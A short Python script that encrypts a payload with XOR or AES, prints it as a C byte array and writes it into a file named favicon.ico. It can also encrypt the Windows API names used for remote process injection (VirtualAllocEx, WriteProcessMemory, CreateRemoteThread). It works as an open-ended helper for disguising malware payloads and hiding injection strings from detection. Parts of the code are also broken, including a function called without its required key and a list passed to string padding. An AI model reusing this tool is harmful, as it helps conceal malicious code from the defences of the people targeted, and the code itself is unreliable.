#!/usr/bin/env python3
import sys
from Crypto.Cipher import AES
from Crypto import Random
from os import urandom
import hashlib
import argparse
import base64

BS = 16
pad = lambda s: bytes(s + (BS - len(s) % BS) * chr(BS - len(s) % BS), 'utf-8')
unpad = lambda s : s[0:-ord(s[-1:])]
class Encrypt:
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-t', type=str, required=True, help="Please enter some plain-text and a key for encryption ", dest='input')
        parser.add_argument('-k', type=str, required=True, help="The key to encrypt the pain-text with", dest='key')
        parser.add_argument('-e', type=str, choices=['aes','xor'], required=True, help="type of encryption you want. choose from (aes, xor)", dest='encryption_type')
        parser.add_argument('-w', type=str, required=True, help="Toggle if you want aes encrypted windows strings",  action=argparse.BooleanOptionalAction)
        args = parser.parse_args()
        self.plaintext = args.input
        self.encryption_key = bytes(args.key, 'utf-8')
        self.encryption_type = args.encryption_type
        self.windows_strings_toggle = args.w

    def xor(self, plaintext, encryption_key):
        encryption_key =str (encryption_key)
        key_length = len(encryption_key)
        output_str = ""
        for index in range(len(plaintext)):
            current = plaintext[index]
            current_encryption_key = encryption_key[index % len(encryption_key)]
            output_str += chr(ord(current) ^ ord(current_encryption_key))
        return output_str

    def ciphertext(self, ciphertext):
        print(" { 0x" + ", 0x".join(hex(x)[2:] for x in ciphertext) + " };\n")

    def aes(self, plaintext, encryption_key):
        plaintext = pad(plaintext)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(encryption_key, AES.MODE_CBC, iv)
        encrypt.ciphertext(cipher.encrypt(bytes(plaintext)))
        return base64.b64encode( iv + cipher.encrypt(bytes(plaintext) ) )

    def decrypt( self, enc, encryption_key):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(encryption_key, AES.MODE_CBC, iv )
        decrypted = unpad(cipher.decrypt( enc[16:] )).decode('utf8')
        print(decrypted)
        #return unpad(cipher.decrypt( enc[16:] )).decode('utf8')

    def encrypt_windows_funcitons(self, encryption_key):
        windows_strings_list = ["kernel32.dll", "explorer.exe", "GetProcAddress", "GetModuleHandleA", "FindResourceA", "LoadResource", \
        "LockResource", "SizeofResource", "VirtualAlloc", "RtlMoveMemory", "CreateToolhelp32Snapshot", "Process32First", \
        "Process32Next", "lstrcmpiA", "CloseHandle", "OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "WaitForSingleObject"]
        encrypt.aes(windows_strings_list, encryption_key)



if __name__ == "__main__":
    encrypt = Encrypt()
    if encrypt.windows_strings_toggle:
        encrypt.encrypt_windows_funcitons()
    if encrypt.encryption_type == "xor":
        xor_ciphertext = encrypt.xor(encrypt.plaintext, encrypt.encryption_key)
        b =  bytes(xor_ciphertext, 'utf-8')
        print("Appending encrypted xor payload to favicon.ico file...")
        open("favicon.ico", "wb").write(b)
        print(" { 0x" + ", 0x".join(hex(ord(x))[2:] for x in xor_ciphertext) + " };")
    else:
        aes_ciphertext = encrypt.aes(encrypt.plaintext, encrypt.encryption_key)
        print("Appending encrypted aes payload to favicon.ico file...")
        open("favicon.ico", "wb").write(aes_ciphertext)
        #decrypted = encrypt.decrypt(aes_ciphertext, encrypt.encryption_key)
